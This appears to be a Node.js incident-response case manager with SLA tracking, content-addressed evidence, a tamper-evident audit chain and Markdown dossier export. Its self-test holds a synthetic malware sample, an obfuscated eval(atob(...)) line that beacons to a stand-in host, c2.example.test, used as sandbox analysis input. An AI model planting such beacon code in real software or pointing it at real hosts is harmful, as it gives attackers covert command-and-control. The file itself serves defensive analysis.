#!/usr/bin/env node
/**
 * IR Case Manager — incident-response case store with content-addressed evidence,
 * SLA accounting, a tamper-evident audit chain and a Markdown case dossier.
 *
 * The store is a single JSON document plus an `objects/` directory keyed by
 * SHA-256. Every mutation is appended to a hash chain, so an investigator can
 * prove that a timeline was not edited after the fact.
 *
 *   create / update / attach / analyze / list / show / close / export / audit / --self-test
 */
import { mkdir, mkdtemp, readFile, rename, rm, writeFile } from 'node:fs/promises'
import { createHash } from 'node:crypto'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { analyzeSample } from '../../../tools/index.js'

const NULL_HASH = '0'.repeat(64)
const STORE_VERSION = 1

/** Severity table: SLA hours and queue weight. Weights order the work queue. */
export const SEVERITIES = Object.freeze({
  P1: { slaHours: 4, weight: 100, label: '严重' },
  P2: { slaHours: 24, weight: 60, label: '高' },
  P3: { slaHours: 72, weight: 30, label: '中' },
  P4: { slaHours: 168, weight: 10, label: '低' },
})

/** Legal status transitions. Closing is only possible through `close()` so a
 * case can never reach `closed` without a resolution and a timestamp. */
export const STATUS_FLOW = Object.freeze({
  new: ['triaged', 'contained'],
  triaged: ['contained', 'new'],
  contained: ['eradicated', 'triaged'],
  eradicated: ['contained'],
  closed: [],
})

export const EVIDENCE_KINDS = Object.freeze(['analysis', 'report', 'log', 'binary', 'note', 'ioc'])

/** Stable JSON with sorted keys; the hash chain must not depend on key order. */
export function canonicalJson(value) {
  if (value === null || typeof value !== 'object') return JSON.stringify(value ?? null)
  if (Array.isArray(value)) return `[${value.map(canonicalJson).join(',')}]`
  const keys = Object.keys(value).sort()
  return `{${keys.map((key) => `${JSON.stringify(key)}:${canonicalJson(value[key])}`).join(',')}}`
}

export function digestOf(value) {
  const text = typeof value === 'string' ? value : canonicalJson(value)
  return createHash('sha256').update(text).digest('hex')
}

/** Deterministic clock: tests advance it explicitly, the CLI starts at wall time. */
export function createClock(options = {}) {
  let current = options.start ? Date.parse(options.start) : Date.now()
  return {
    now: () => current,
    iso: () => new Date(current).toISOString(),
    advance(ms) {
      current += ms
      return new Date(current).toISOString()
    },
    set(value) {
      current = value instanceof Date ? value.getTime() : Date.parse(value)
      return new Date(current).toISOString()
    },
  }
}

function assertSeverity(severity) {
  if (!SEVERITIES[severity]) throw new Error(`unknown severity ${severity} (expected ${Object.keys(SEVERITIES).join('|')})`)
  return severity
}

function requireText(value, field) {
  const text = typeof value === 'string' ? value.trim() : ''
  if (text.length === 0) throw new Error(`${field} is required`)
  return text
}

/**
 * @param {string} directory
 * @param {{clock?: ReturnType<typeof createClock>, seed?: number}} [options]
 */
export function createCaseStore(directory, options = {}) {
  const clock = options.clock ?? createClock()
  const seed = options.seed ?? 0x5eed
  const storePath = join(directory, 'store.json')
  const objectRoot = join(directory, 'objects')
  let queue = Promise.resolve()

  /** Serialise mutations: two concurrent CLI invocations must not interleave writes. */
  const locked = (work) => {
    const run = queue.then(work, work)
    queue = run.then(
      () => undefined,
      () => undefined,
    )
    return run
  }

  const emptyState = () => ({ version: STORE_VERSION, seq: 0, cases: {}, audit: [] })

  const load = async () => {
    try {
      const state = JSON.parse(await readFile(storePath, 'utf8'))
      if (state.version !== STORE_VERSION) throw new Error(`store version ${state.version} is not supported`)
      return state
    } catch (error) {
      if (error.code === 'ENOENT') return emptyState()
      throw error
    }
  }

  const save = async (state) => {
    await mkdir(directory, { recursive: true })
    const temporary = `${storePath}.${process.pid}.tmp`
    await writeFile(temporary, `${JSON.stringify(state, null, 2)}\n`, 'utf8')
    await rename(temporary, storePath)
  }

  const objectPath = (digest) => join(objectRoot, digest.slice(0, 2), digest)

  const writeObject = async (content) => {
    const digest = digestOf(content)
    const target = objectPath(digest)
    await mkdir(join(objectRoot, digest.slice(0, 2)), { recursive: true })
    try {
      await readFile(target)
      return { digest, stored: false, size: Buffer.byteLength(content) }
    } catch {
      await writeFile(target, content, 'utf8')
      return { digest, stored: true, size: Buffer.byteLength(content) }
    }
  }

  const readObject = async (digest) => readFile(objectPath(digest), 'utf8')

  const append = (state, entry) => {
    const previous = state.audit.length > 0 ? state.audit[state.audit.length - 1].hash : NULL_HASH
    const record = {
      seq: state.audit.length + 1,
      at: new Date(clock.now()).toISOString(),
      actor: entry.actor ?? 'system',
      action: entry.action,
      caseId: entry.caseId ?? null,
      data: entry.data ?? {},
      dataHash: digestOf(entry.data ?? {}),
      prev: previous,
    }
    const sealed = digestOf({
      seq: record.seq,
      at: record.at,
      actor: record.actor,
      action: record.action,
      caseId: record.caseId,
      dataHash: record.dataHash,
      prev: record.prev,
    })
    state.audit.push({ ...record, hash: sealed })
    return state.audit[state.audit.length - 1]
  }

  const raise = (state, caseId, code, detail, actor) =>
    append(state, { action: 'alert', caseId, actor, data: { code, detail } })

  const deriveSla = (createdAtMs, severity) => {
    const hours = SEVERITIES[severity].slaHours
    return { dueAtMs: createdAtMs + hours * 3_600_000, budgetMs: hours * 3_600_000 }
  }

  const priorityScore = (incident) => {
    const base = SEVERITIES[incident.severity].weight
    const tagBoost = incident.tags.filter((tag) => ['ransomware', 'espionage', 'data-loss'].includes(tag)).length * 15
    const statusBoost = incident.status === 'closed' ? -1000 : 0
    const sla = slaStateOf(incident)
    const slaBoost = sla.state === 'breached' ? 40 : sla.state === 'at-risk' ? 20 : 0
    return base + tagBoost + statusBoost + slaBoost
  }

  const slaStateOf = (incident) => {
    if (incident.status === 'closed') return { state: 'closed', remainingMs: 0 }
    const remainingMs = incident.sla.dueAtMs - clock.now()
    const used = incident.sla.budgetMs - remainingMs
    if (remainingMs < 0) return { state: 'breached', remainingMs }
    if (used >= incident.sla.budgetMs * 0.75) return { state: 'at-risk', remainingMs }
    return { state: 'ok', remainingMs }
  }

  const publicCase = (incident) => ({ ...incident, priorityScore: priorityScore(incident), slaState: slaStateOf(incident) })

  const nextCaseId = (state, title) => {
    state.seq += 1
    return `IR-${digestOf({ title, seq: state.seq, createdAt: clock.now() }).slice(0, 10).toUpperCase()}`
  }

  const store = {
    directory,
    clock,

    async create(input = {}) {
      return locked(async () => {
        const title = requireText(input.title, 'title')
        const severity = assertSeverity(input.severity ?? 'P3')
        const state = await load()
        const createdAtMs = clock.now()
        const id = nextCaseId(state, title)
        const sla = deriveSla(createdAtMs, severity)
        const incident = {
          id,
          title,
          severity,
          status: 'new',
          summary: input.summary ?? '',
          assignee: input.assignee ?? null,
          tags: Array.isArray(input.tags) ? [...new Set(input.tags.map(String))].sort() : [],
          createdAt: new Date(createdAtMs).toISOString(),
          createdAtMs,
          updatedAt: new Date(createdAtMs).toISOString(),
          closedAt: null,
          resolution: null,
          sla: { dueAt: new Date(sla.dueAtMs).toISOString(), dueAtMs: sla.dueAtMs, budgetMs: sla.budgetMs },
          evidence: [],
          analysis: null,
          seq: state.seq,
        }
        state.cases[id] = incident
        append(state, { action: 'case.create', caseId: id, actor: input.actor, data: { title, severity, sla: incident.sla.dueAt } })
        await save(state)
        return publicCase(incident)
      })
    },

    async get(id) {
      const state = await load()
      const incident = state.cases[id]
      if (!incident) throw new Error(`case ${id} not found`)
      return publicCase(incident)
    },

    async find(prefix) {
      const state = await load()
      const matches = Object.values(state.cases).filter((incident) => incident.id.startsWith(prefix))
      if (matches.length > 1) throw new Error(`prefix ${prefix} is ambiguous (${matches.length} cases)`)
      return matches.length === 1 ? publicCase(matches[0]) : null
    },

    async list(filters = {}) {
      const state = await load()
      const cases = Object.values(state.cases)
        .filter((incident) => !filters.status || incident.status === filters.status)
        .filter((incident) => !filters.severity || incident.severity === filters.severity)
        .filter((incident) => !filters.tag || incident.tags.includes(filters.tag))
        .map(publicCase)
        .sort((a, b) => b.priorityScore - a.priorityScore || a.createdAt.localeCompare(b.createdAt))
      return cases
    },

    async update(id, patch = {}) {
      return locked(async () => {
        const state = await load()
        const incident = state.cases[id]
        if (!incident) throw new Error(`case ${id} not found`)
        if (incident.status === 'closed') throw new Error(`case ${id} is closed; reopen it before editing`)
        const changed = {}
        if (patch.title !== undefined) {
          incident.title = requireText(patch.title, 'title')
          changed.title = incident.title
        }
        if (patch.assignee !== undefined) {
          incident.assignee = patch.assignee
          changed.assignee = patch.assignee
        }
        if (patch.summary !== undefined) {
          incident.summary = String(patch.summary)
          changed.summary = incident.summary.length
        }
        if (patch.severity !== undefined) {
          incident.severity = assertSeverity(patch.severity)
          const sla = deriveSla(incident.createdAtMs, incident.severity)
          incident.sla = { dueAt: new Date(sla.dueAtMs).toISOString(), dueAtMs: sla.dueAtMs, budgetMs: sla.budgetMs }
          changed.severity = incident.severity
          changed.dueAt = incident.sla.dueAt
        }
        if (patch.tags !== undefined) {
          incident.tags = [...new Set((patch.tags ?? []).map(String))].sort()
          changed.tags = incident.tags
        }
        if (patch.status === 'closed') throw new Error('use the close command to close a case')
        if (patch.status !== undefined) {
          const allowed = STATUS_FLOW[incident.status] ?? []
          if (!allowed.includes(patch.status)) {
            throw new Error(`illegal transition ${incident.status} -> ${patch.status} (allowed: ${allowed.join('|') || 'none'})`)
          }
          changed.from = incident.status
          incident.status = patch.status
          changed.status = patch.status
        }
        if (Object.keys(changed).length === 0) throw new Error('nothing to update')
        incident.updatedAt = new Date(clock.now()).toISOString()
        append(state, { action: 'case.update', caseId: id, actor: patch.actor, data: changed })
        const sla = slaStateOf(incident)
        if (sla.state === 'breached') raise(state, id, 'SLA_BREACHED', `SLA due ${incident.sla.dueAt} exceeded`, patch.actor)
        await save(state)
        return publicCase(incident)
      })
    },

    async attach(id, input = {}) {
      return locked(async () => {
        const kind = input.kind ?? 'binary'
        if (!EVIDENCE_KINDS.includes(kind)) throw new Error(`unknown evidence kind ${kind}`)
        const name = requireText(input.name, 'name')
        const content = typeof input.content === 'string' ? input.content : JSON.stringify(input.content ?? null)
        const state = await load()
        const incident = state.cases[id]
        if (!incident) throw new Error(`case ${id} not found`)
        if (incident.status === 'closed') throw new Error(`case ${id} is closed; evidence is immutable`)
        const object = await writeObject(content)
        const existing = incident.evidence.find((item) => item.digest === object.digest)
        if (existing) {
          append(state, { action: 'evidence.dedupe', caseId: id, actor: input.actor, data: { digest: object.digest, kind } })
          await save(state)
          return { ...existing, duplicate: true, objectStored: false }
        }
        const record = {
          digest: object.digest,
          kind,
          name,
          size: object.size,
          addedAt: new Date(clock.now()).toISOString(),
          addedBy: input.actor ?? 'system',
        }
        incident.evidence.push(record)
        incident.updatedAt = record.addedAt
        append(state, { action: 'evidence.attach', caseId: id, actor: input.actor, data: { digest: record.digest, kind, name, size: record.size } })
        await save(state)
        return { ...record, duplicate: false, objectStored: object.stored }
      })
    },

    async readEvidence(id, digest) {
      const incident = await store.get(id)
      if (!incident.evidence.some((item) => item.digest === digest)) throw new Error(`evidence ${digest} is not attached to ${id}`)
      return readObject(digest)
    },

    /** Run the platform pipeline and file both the report and the source as evidence. */
    async analyze(id, input = {}) {
      const source = requireText(input.source, 'source')
      const incident = await store.get(id)
      const result = await analyzeSample(source, {
        name: input.name ?? `${incident.id}.sample.js`,
        logLevel: 'silent',
        seed,
        network: { policy: 'deny' },
      })
      const report = result.report
      const summary = {
        verdict: report.verdict.level,
        score: report.verdict.score,
        families: report.verdict.families,
        techniques: report.static.techniques,
        iocHosts: [...new Set((report.static.iocs?.urls ?? []).map((url) => url.host))].sort(),
        artifacts: report.artifacts.length,
        killChain: report.dynamic.behavior.killChain.map((stage) => stage.stage),
        sha256: report.sample.sha256,
        disposalOk: result.run?.disposal?.ok === true,
      }
      const reportEvidence = await store.attach(id, {
        kind: 'analysis',
        name: `${input.name ?? 'sample.js'}.report.json`,
        content: `${JSON.stringify(report, null, 2)}\n`,
        actor: input.actor ?? 'analyst',
      })
      const sourceEvidence = await store.attach(id, {
        kind: 'binary',
        name: input.name ?? 'sample.js',
        content: source,
        actor: input.actor ?? 'analyst',
      })
      return locked(async () => {
        const state = await load()
        const target = state.cases[id]
        target.analysis = summary
        target.updatedAt = new Date(clock.now()).toISOString()
        append(state, {
          action: 'case.analyze',
          caseId: id,
          actor: input.actor ?? 'analyst',
          data: { verdict: summary.verdict, score: summary.score, sha256: summary.sha256 },
        })
        if (summary.verdict === 'malicious' && target.severity !== 'P1') {
          raise(state, id, 'SEVERITY_REVIEW', `analysis verdict malicious while severity is ${target.severity}`, input.actor)
        }
        await save(state)
        return { summary, evidence: [reportEvidence.digest, sourceEvidence.digest] }
      })
    },

    async close(id, input = {}) {
      return locked(async () => {
        const state = await load()
        const incident = state.cases[id]
        if (!incident) throw new Error(`case ${id} not found`)
        if (incident.status === 'closed') throw new Error(`case ${id} is already closed`)
        const resolution = requireText(input.resolution, 'resolution')
        const now = clock.now()
        incident.status = 'closed'
        incident.resolution = resolution
        incident.closedAt = new Date(now).toISOString()
        incident.updatedAt = incident.closedAt
        const sla = slaStateOf({ ...incident, status: 'triaged' })
        const dwellMs = now - incident.createdAtMs
        append(state, { action: 'case.close', caseId: id, actor: input.actor, data: { resolution, dwellMs, slaAtClose: sla.state } })
        if (sla.state === 'breached') raise(state, id, 'CLOSED_LATE', `closed ${Math.round(-sla.remainingMs / 60000)}m after SLA due`, input.actor)
        await save(state)
        return publicCase(incident)
      })
    },

    async reopen(id, input = {}) {
      return locked(async () => {
        const state = await load()
        const incident = state.cases[id]
        if (!incident) throw new Error(`case ${id} not found`)
        if (incident.status !== 'closed') throw new Error(`case ${id} is not closed`)
        incident.status = 'triaged'
        incident.closedAt = null
        incident.resolution = null
        incident.updatedAt = new Date(clock.now()).toISOString()
        append(state, { action: 'case.reopen', caseId: id, actor: input.actor, data: { reason: input.reason ?? null } })
        await save(state)
        return publicCase(incident)
      })
    },

    async verifyTrail() {
      const state = await load()
      let previous = NULL_HASH
      for (let index = 0; index < state.audit.length; index += 1) {
        const entry = state.audit[index]
        if (entry.seq !== index + 1) return { ok: false, entries: state.audit.length, brokenAt: index, reason: 'sequence' }
        if (entry.prev !== previous) return { ok: false, entries: state.audit.length, brokenAt: index, reason: 'link' }
        if (entry.dataHash !== digestOf(entry.data ?? {})) return { ok: false, entries: state.audit.length, brokenAt: index, reason: 'payload' }
        const sealed = digestOf({
          seq: entry.seq,
          at: entry.at,
          actor: entry.actor,
          action: entry.action,
          caseId: entry.caseId,
          dataHash: entry.dataHash,
          prev: entry.prev,
        })
        if (sealed !== entry.hash) return { ok: false, entries: state.audit.length, brokenAt: index, reason: 'hash' }
        previous = entry.hash
      }
      return { ok: true, entries: state.audit.length, brokenAt: -1, reason: null, head: previous }
    },

    async trail(caseId = null) {
      const state = await load()
      return caseId ? state.audit.filter((entry) => entry.caseId === caseId) : state.audit
    },

    async stats() {
      const cases = await store.list()
      const byStatus = {}
      const bySeverity = {}
      const bySla = {}
      for (const incident of cases) {
        byStatus[incident.status] = (byStatus[incident.status] ?? 0) + 1
        bySeverity[incident.severity] = (bySeverity[incident.severity] ?? 0) + 1
        bySla[incident.slaState.state] = (bySla[incident.slaState.state] ?? 0) + 1
      }
      return { total: cases.length, byStatus, bySeverity, bySla, open: cases.filter((incident) => incident.status !== 'closed').length }
    },

    async exportMarkdown(id) {
      const incident = await store.get(id)
      const trail = await store.trail(id)
      const chain = await store.verifyTrail()
      const lines = []
      lines.push(`# 事件响应档案 ${incident.id}`)
      lines.push('')
      lines.push(`- 标题: ${incident.title}`)
      lines.push(`- 严重级别: ${incident.severity} (${SEVERITIES[incident.severity].label})${incident.status === 'closed' ? '' : ` / 队列优先级 ${incident.priorityScore}`}`)
      lines.push(`- 状态: ${incident.status}`)
      lines.push(`- 负责人: ${incident.assignee ?? '未指派'}`)
      lines.push(`- 标签: ${incident.tags.length > 0 ? incident.tags.join(', ') : '—'}`)
      lines.push(`- 建立时间: ${incident.createdAt}`)
      lines.push(`- SLA 截止: ${incident.sla.dueAt} (${incident.slaState.state})`)
      if (incident.closedAt) lines.push(`- 关闭时间: ${incident.closedAt} / 结论: ${incident.resolution}`)
      lines.push('')
      lines.push('## 概述')
      lines.push(incident.summary || '(未填写)')
      lines.push('')
      lines.push('## 分析结论')
      if (incident.analysis) {
        const analysis = incident.analysis
        lines.push(`- 判定: **${analysis.verdict}** (score ${analysis.score}, 家族 ${analysis.families.join('/') || '—'})`)
        lines.push(`- 样本 SHA-256: \`${analysis.sha256}\``)
        lines.push(`- 技术点: ${analysis.techniques.join(', ') || '—'}`)
        lines.push(`- IOC 主机: ${analysis.iocHosts.join(', ') || '—'}`)
        lines.push(`- 杀伤链: ${analysis.killChain.join(' -> ') || '—'}`)
        lines.push(`- 沙箱销毁: ${analysis.disposalOk ? '正常' : '异常'}`)
      } else {
        lines.push('(尚无分析)')
      }
      lines.push('')
      lines.push('## 证据清单')
      if (incident.evidence.length === 0) lines.push('(无)')
      else {
        lines.push('| # | 类型 | 名称 | 大小(B) | SHA-256 | 时间 |')
        lines.push('| - | ---- | ---- | ------- | ------- | ---- |')
        incident.evidence.forEach((item, index) => {
          lines.push(`| ${index + 1} | ${item.kind} | ${item.name} | ${item.size} | \`${item.digest.slice(0, 16)}\` | ${item.addedAt} |`)
        })
      }
      lines.push('')
      lines.push('## 处置时间线')
      const entries = trail.length > 0 ? trail : []
      for (const entry of entries) {
        lines.push(`- ${entry.at} · ${entry.action} · ${entry.actor} · \`${entry.hash.slice(0, 12)}\``)
      }
      lines.push('')
      lines.push('## 审计链')
      lines.push(`- 链状态: ${chain.ok ? '完整' : `破损@${chain.brokenAt}(${chain.reason})`}`)
      lines.push(`- 条目数: ${chain.entries}`)
      lines.push(`- 链头: \`${chain.head}\``)
      lines.push('')
      lines.push(`> 导出时间 ${clock.iso()} · 本文件由 IR Case Manager 生成`)
      return `${lines.join('\n')}\n`
    },
  }

  return store
}

async function selfTest() {
  const directory = await mkdtemp(join(tmpdir(), 'ir-case-'))
  try {
    const clock = createClock({ start: '2024-03-01T08:00:00.000Z' })
    const store = createCaseStore(join(directory, 'store'), { clock, seed: 0x5eed })

    const ransomware = await store.create({
      title: '工作站勒索软件横向移动',
      severity: 'P1',
      summary: 'EDR 在财务部主机发现批量文件加密与 SMB 横向连接',
      assignee: 'zhang.li',
      tags: ['ransomware', 'lateral-movement'],
      actor: 'soc-bot',
    })
    if (!/^IR-[0-9A-F]{10}$/.test(ransomware.id)) throw new Error(`case id format: ${ransomware.id}`)
    if (ransomware.status !== 'new') throw new Error('new case must start in status new')
    if (ransomware.slaState.state !== 'ok') throw new Error(`expected ok SLA, got ${ransomware.slaState.state}`)

    const phishing = await store.create({
      title: '钓鱼邮件附件投放',
      severity: 'P3',
      summary: '邮件网关拦截了一批带 JS 附件的钓鱼邮件',
      tags: ['phishing'],
      actor: 'soc-bot',
    })

    const analysis = await store.analyze(ransomware.id, {
      name: 'locker.js',
      source: 'eval(atob("ZmV0Y2goJ2h0dHBzOi8vYzIuZXhhbXBsZS50ZXN0L2JlYWNvbicp")); fetch("https://c2.example.test/beacon").catch(function(){}); localStorage.setItem("k","v");',
      actor: 'analyst.wang',
    })
    if (!['suspicious', 'malicious'].includes(analysis.summary.verdict)) throw new Error(`analysis verdict ${analysis.summary.verdict}`)
    if (!analysis.summary.iocHosts.includes('c2.example.test')) throw new Error('analysis IOC host missing')
    if (analysis.evidence.length !== 2) throw new Error('analysis evidence not filed')

    const duplicate = await store.attach(ransomware.id, { kind: 'log', name: 'proxy.log', content: 'GET /beacon 200\n', actor: 'analyst.wang' })
    const again = await store.attach(ransomware.id, { kind: 'log', name: 'proxy-copy.log', content: 'GET /beacon 200\n', actor: 'analyst.wang' })
    if (duplicate.duplicate || !again.duplicate) throw new Error('content-addressed dedupe failed')
    if (again.digest !== duplicate.digest) throw new Error('digest mismatch for identical content')
    if (again.size !== Buffer.byteLength('GET /beacon 200\n')) throw new Error('evidence size mismatch')
    const object = await store.readEvidence(ransomware.id, duplicate.digest)
    if (object !== 'GET /beacon 200\n') throw new Error('stored object mismatch')

    clock.advance(30 * 60_000)
    const triaged = await store.update(ransomware.id, { status: 'triaged', actor: 'analyst.wang' })
    if (triaged.status !== 'triaged') throw new Error('status update failed')
    if (triaged.slaState.state !== 'ok') throw new Error('SLA should still be ok after 30m')

    const listed = await store.list()
    if (listed.length !== 2) throw new Error(`expected 2 cases, got ${listed.length}`)
    if (listed[0].id !== ransomware.id) throw new Error('priority ordering failed')
    if (listed[0].priorityScore <= listed[1].priorityScore) throw new Error('priority score not ordered')
    const openOnly = await store.list({ status: 'new' })
    if (openOnly.length !== 1 || openOnly[0].id !== phishing.id) throw new Error('status filter failed')

    clock.advance(5 * 3_600_000)
    const breached = await store.get(ransomware.id)
    if (breached.slaState.state !== 'breached') throw new Error(`expected breached SLA, got ${breached.slaState.state}`)

    let illegal = null
    try {
      await store.update(ransomware.id, { status: 'eradicated' })
    } catch (error) {
      illegal = error.message
    }
    if (!illegal || !illegal.includes('illegal transition')) throw new Error('illegal transition not rejected')

    const closed = await store.close(ransomware.id, { resolution: '隔离主机并清除持久化，凭据全部轮换', actor: 'cse.liu' })
    if (closed.status !== 'closed' || !closed.closedAt) throw new Error('close failed')
    let doubleClose = null
    try {
      await store.close(ransomware.id, { resolution: 'again' })
    } catch (error) {
      doubleClose = error.message
    }
    if (!doubleClose || !doubleClose.includes('already closed')) throw new Error('double close not rejected')

    const dossier = await store.exportMarkdown(ransomware.id)
    for (const heading of ['事件响应档案', '分析结论', '证据清单', '处置时间线', '审计链']) {
      if (!dossier.includes(heading)) throw new Error(`dossier missing section ${heading}`)
    }
    if (!dossier.includes('c2.example.test')) throw new Error('dossier missing IOC host')
    if (!dossier.includes(duplicate.digest.slice(0, 16))) throw new Error('dossier missing evidence digest')

    const trail = await store.verifyTrail()
    if (!trail.ok) throw new Error(`audit chain broken at ${trail.brokenAt} (${trail.reason})`)
    if (trail.entries < 10) throw new Error(`expected at least 10 audit entries, got ${trail.entries}`)
    if (!/^[0-9a-f]{64}$/.test(trail.head)) throw new Error('chain head is not a digest')

    const stats = await store.stats()
    if (stats.total !== 2) throw new Error(`stats total ${stats.total}`)
    if (stats.byStatus.closed !== 1 || stats.byStatus.new !== 1) throw new Error(`stats byStatus ${JSON.stringify(stats.byStatus)}`)
    if (stats.open !== 1) throw new Error(`stats open ${stats.open}`)

    const storePath = join(directory, 'store', 'store.json')
    const tampered = JSON.parse(await readFile(storePath, 'utf8'))
    tampered.audit[2].data = { ...tampered.audit[2].data, forged: true }
    await writeFile(storePath, `${JSON.stringify(tampered)}\n`, 'utf8')
    const broken = await store.verifyTrail()
    if (broken.ok) throw new Error('tampering was not detected')
    if (broken.brokenAt !== 2 || broken.reason !== 'payload') throw new Error(`tamper location ${broken.brokenAt}/${broken.reason}`)

    console.log(
      `ir-case: cases=${stats.total} audit=${trail.entries} chain=${trail.ok ? 'ok' : 'broken'} sla=${JSON.stringify(stats.bySla)} tamper=${broken.reason}@${broken.brokenAt}`,
    )
    console.log('SELFTEST OK')
  } finally {
    await rm(directory, { recursive: true, force: true })
  }
}

function option(args, name, fallback) {
  const index = args.indexOf(name)
  return index >= 0 && args[index + 1] ? args[index + 1] : fallback
}

function flag(args, name) {
  return args.includes(name)
}

async function main() {
  const argv = process.argv.slice(2)
  const command = argv[0]
  if (command === '--self-test') return selfTest()
  if (!command || command === '--help') {
    console.log(
      [
        'IR Case Manager',
        '  create --title <t> [--severity P1] [--assignee a] [--tags a,b] [--summary s] [--dir store]',
        '  list [--status s] [--severity P1] [--json] [--dir store]',
        '  show <case-id|prefix> [--json]',
        '  update <case-id> [--status triaged] [--assignee a] [--severity P2]',
        '  attach <case-id> --kind log|report|ioc --name n --file path',
        '  analyze <case-id> --file sample.js [--name sample.js]',
        '  close <case-id> --resolution text',
        '  export <case-id> [--out dossier.md]',
        '  audit [--case <case-id>]',
        '  --self-test',
      ].join('\n'),
    )
    if (!command) process.exitCode = 2
    return
  }
  const store = createCaseStore(option(argv, '--dir', 'store'))
  if (command === 'create') {
    const tags = option(argv, '--tags', '')
    const incident = await store.create({
      title: option(argv, '--title', ''),
      severity: option(argv, '--severity', 'P3'),
      assignee: option(argv, '--assignee', null),
      summary: option(argv, '--summary', ''),
      tags: tags ? tags.split(',').map((tag) => tag.trim()).filter(Boolean) : [],
      actor: option(argv, '--actor', 'cli'),
    })
    console.log(JSON.stringify(incident, null, 2))
  } else if (command === 'list') {
    const cases = await store.list({ status: option(argv, '--status', null), severity: option(argv, '--severity', null) })
    if (flag(argv, '--json')) console.log(JSON.stringify(cases, null, 2))
    else {
      for (const incident of cases) {
        console.log(
          `${incident.id}  ${incident.severity}  ${incident.status.padEnd(10)} ${String(incident.priorityScore).padStart(4)}  ${incident.slaState.state.padEnd(9)} ${incident.title}`,
        )
      }
      console.log(`${cases.length} case(s)`)
    }
  } else if (command === 'show' || command === 'export') {
    const id = argv[1]
    if (!id) throw new Error(`${command} requires a case id`)
    if (command === 'export') {
      const markdown = await store.exportMarkdown(id)
      const out = option(argv, '--out', null)
      if (out) {
        await writeFile(out, markdown, 'utf8')
        console.log(`wrote ${out} (${Buffer.byteLength(markdown)} bytes)`)
      } else process.stdout.write(markdown)
    } else {
      const incident = await store.get(id).catch(async (error) => {
        const match = await store.find(id)
        if (!match) throw error
        return match
      })
      console.log(JSON.stringify(incident, null, 2))
    }
  } else if (command === 'update') {
    const id = argv[1]
    if (!id) throw new Error('update requires a case id')
    const patch = { actor: option(argv, '--actor', 'cli') }
    for (const field of ['title', 'assignee', 'severity', 'status', 'summary']) {
      const value = option(argv, `--${field}`, undefined)
      if (value !== undefined) patch[field] = value
    }
    const updated = await store.update(id, patch)
    console.log(`${updated.id} ${updated.status} ${updated.severity} sla=${updated.slaState.state}`)
  } else if (command === 'attach') {
    const id = argv[1]
    if (!id) throw new Error('attach requires a case id')
    const file = option(argv, '--file', null)
    if (!file) throw new Error('attach requires --file')
    const record = await store.attach(id, {
      kind: option(argv, '--kind', 'binary'),
      name: option(argv, '--name', file.split('/').pop()),
      content: await readFile(file, 'utf8'),
      actor: option(argv, '--actor', 'cli'),
    })
    console.log(`${record.digest} ${record.kind} ${record.name} dedupe=${record.duplicate}`)
  } else if (command === 'analyze') {
    const id = argv[1]
    if (!id) throw new Error('analyze requires a case id')
    const file = option(argv, '--file', null)
    if (!file) throw new Error('analyze requires --file')
    const result = await store.analyze(id, {
      source: await readFile(file, 'utf8'),
      name: option(argv, '--name', file.split('/').pop()),
      actor: option(argv, '--actor', 'cli'),
    })
    console.log(JSON.stringify(result.summary, null, 2))
  } else if (command === 'close') {
    const id = argv[1]
    if (!id) throw new Error('close requires a case id')
    const closed = await store.close(id, { resolution: option(argv, '--resolution', ''), actor: option(argv, '--actor', 'cli') })
    console.log(`${closed.id} closed at ${closed.closedAt}`)
  } else if (command === 'audit') {
    const caseId = option(argv, '--case', null)
    const chain = await store.verifyTrail()
    console.log(`chain ok=${chain.ok} entries=${chain.entries} head=${chain.head.slice(0, 16)}`)
    if (!chain.ok) process.exitCode = 1
    for (const entry of await store.trail(caseId)) {
      console.log(`${entry.seq}\t${entry.at}\t${entry.action}\t${entry.actor}\t${entry.hash.slice(0, 12)}`)
    }
  } else {
    throw new Error(`unknown command ${command}`)
  }
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((error) => {
    console.error(`error: ${error.message}`)
    process.exitCode = 1
  })
}
